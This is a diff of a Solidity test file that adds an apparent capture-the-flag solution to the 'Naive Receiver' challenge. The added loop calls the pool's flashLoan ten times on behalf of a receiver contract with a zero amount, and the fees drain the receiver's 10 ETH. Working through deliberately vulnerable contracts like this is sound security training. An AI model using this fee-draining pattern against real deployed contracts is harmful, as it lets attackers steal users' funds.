@@ -44,11 +44,17 @@ contract NaiveReceiver is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitNaiveReciever() public {
         /**
          * EXPLOIT START *
          */
-
+ /// call the flashLoan function 10 times to drain all 10 ETH
+    for (uint256 i = 0; i < 10; i++) {
+        naiveReceiverLenderPool.flashLoan(
+            address(flashLoanReceiver),
+            0  // We don't need to actually borrow any ETH
+        );
+    }
         /**
          * EXPLOIT END *
          */
